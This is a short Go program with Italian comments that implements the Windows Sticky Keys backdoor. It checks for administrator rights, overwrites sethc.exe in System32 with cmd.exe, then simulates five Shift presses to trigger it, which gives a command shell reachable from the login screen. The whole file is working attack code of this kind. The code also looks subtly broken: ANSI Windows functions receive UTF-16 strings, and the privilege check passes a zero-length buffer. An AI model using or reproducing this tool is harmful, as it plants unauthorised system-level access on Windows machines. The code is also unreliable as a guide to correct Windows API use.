package main

import (
	"log"
	"syscall"
	"time"
	"unsafe"
)

var (
	modkernel32 = syscall.NewLazyDLL("kernel32.dll")
	moduser32   = syscall.NewLazyDLL("user32.dll")
	modadvapi32 = syscall.NewLazyDLL("advapi32.dll")

	procCopyFile          = modkernel32.NewProc("CopyFileA")
	procSetFileAttributes = modkernel32.NewProc("SetFileAttributesA")
	procKeybdEvent        = moduser32.NewProc("keybd_event")
	procOpenProcessToken  = modadvapi32.NewProc("OpenProcessToken")
	procGetTokenInformation = modadvapi32.NewProc("GetTokenInformation")
	procAdjustTokenPrivileges = modadvapi32.NewProc("AdjustTokenPrivileges")
	procLookupPrivilegeValue = modadvapi32.NewProc("LookupPrivilegeValueA")
)

const (
	VK_SHIFT      = 0x10
	TOKEN_QUERY   = 0x0008
	TOKEN_ADJUST  = 0x0020
	SE_PRIVILEGE_ENABLED = 0x00000002
	TOKEN_ELEVATION = 20
)

func main() {
	if !isAdmin() {
		log.Fatal("Errore: Richiesti privilegi di amministratore.")
	}

	// Sostituisci sethc.exe con cmd.exe
	copyFile("C:\\Windows\\System32\\cmd.exe", "C:\\Windows\\System32\\sethc.exe")

	// Triggera Sticky Keys (Shift 5x)
	for i := 0; i < 5; i++ {
		procKeybdEvent.Call(VK_SHIFT, 0, 0, 0)       // Shift down
		procKeybdEvent.Call(VK_SHIFT, 0, 2, 0)       // Shift up
		time.Sleep(50 * time.Millisecond)
	}
}

// --- Funzioni di supporto (ottimizzate) ---
func isAdmin() bool {
	var token syscall.Token
	r, _, _ := procOpenProcessToken.Call(
		uintptr(syscall.GetCurrentProcess()),
		TOKEN_QUERY|TOKEN_ADJUST,
		uintptr(unsafe.Pointer(&token)),
	)
	if r == 0 {
		return false
	}
	defer syscall.CloseHandle(syscall.Handle(token))

	var elevation uint32
	var size uint32
	r, _, _ = procGetTokenInformation.Call(
		uintptr(token),
		TOKEN_ELEVATION,
		uintptr(unsafe.Pointer(&elevation)),
		0,
		uintptr(unsafe.Pointer(&size)),
	)
	return r != 0 && elevation != 0
}

func copyFile(src, dst string) {
	// Rimuovi attributi di sola lettura (se presenti)
	procSetFileAttributes.Call(uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(dst))), 0x80) // FILE_ATTRIBUTE_NORMAL

	// Copia il file
	r, _, _ := procCopyFile.Call(
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(src))),
		uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(dst))),
		0, // bFailIfExists = FALSE (sovrascrivi)
	)
	if r == 0 {
		log.Fatal("Errore nella copia del file.")
	}
}
